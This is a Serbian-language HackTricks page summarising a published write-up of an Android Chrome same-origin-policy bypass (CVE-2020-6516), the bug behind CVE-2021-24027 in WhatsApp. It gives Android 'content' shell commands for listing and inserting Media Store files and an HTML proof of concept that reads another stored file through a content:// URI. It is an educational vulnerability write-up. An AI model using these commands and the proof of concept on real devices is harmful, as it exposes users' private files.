<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**Ovo je saÅ¾etak posta [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)**

### Listing Files in Media Store
Za prikazivanje fajlova upravljanih od strane Media Store-a, moÅ¾e se koristiti sledeÄ‡a komanda:
```bash
$ content query --uri content://media/external/file
```
Za korisniÄki prihvatljiviji izlaz, prikazujemo samo identifikator i putanju svake indeksirane datoteke:
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
Content provajderi su izolovani u sopstvenom privatnom prostoru imena. Pristup provajderu zahteva odreÄ‘eni `content://` URI. Informacije o putanjama za pristup provajderu mogu se dobiti iz manifesta aplikacije ili izvornog koda Android okvira.

### Chrome-ov pristup provajderima sadrÅ¾aja
Chrome na Androidu moÅ¾e pristupiti provajderima sadrÅ¾aja putem Å¡eme `content://`, omoguÄ‡avajuÄ‡i mu pristup resursima poput fotografija ili dokumenata izvezenih od strane aplikacija treÄ‡ih lica. Da bismo ilustrovali ovo, datoteka moÅ¾e biti ubaÄena u Media Store i zatim pristupljena putem Chrome-a:

Ubacite prilagoÄ‘eni unos u Media Store:
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
Otkrijte identifikator novoubaÄene datoteke:
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
Fajl zatim moÅ¾e biti pregledan u Chrome-u koristeÄ‡i URL konstruisan sa identifikatorom fajla.

Na primer, da biste videli listu fajlova koji se odnose na odreÄ‘enu aplikaciju:
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Bypass pravila o istom poreklu

_Same Origin Policy_ (SOP) je sigurnosni protokol u pregledaÄima koji ograniÄava web stranice da komuniciraju sa resursima sa razliÄitih porekla, osim ako eksplicitno nije dozvoljeno politikom deljenja resursa sa razliÄitog porekla (CORS). Ova politika ima za cilj da spreÄi curenje informacija i krivotvorenje zahteva sa drugih sajtova. Chrome smatra `content://` lokalnom Å¡emom, implicirajuÄ‡i stroÅ¾ija pravila SOP, gde se svaki URL lokalne Å¡eme tretira kao zasebno poreklo.

MeÄ‘utim, CVE-2020-6516 je bila ranjivost u Chrome-u koja je omoguÄ‡ila zaobilaÅ¾enje pravila SOP za resurse uÄitane putem `content://` URL-a. U suÅ¡tini, JavaScript kod sa `content://` URL-a mogao je pristupiti drugim resursima uÄitanim putem `content://` URL-ova, Å¡to je predstavljalo znaÄajan sigurnosni problem, posebno na Android ureÄ‘ajima koji koriste verzije pre Android 10, gde nije implementiran ograniÄeni prostor za skladiÅ¡tenje.

Dole navedeni dokaz koncepta demonstrira ovu ranjivost, gde HTML dokument, nakon Å¡to je otpremljen pod **/sdcard** i dodat u Media Store, koristi `XMLHttpRequest` u svom JavaScript-u da pristupi i prikaÅ¾e sadrÅ¾aj druge datoteke u Media Store-u, zaobilazeÄ‡i pravila SOP.

Dokaz koncepta HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
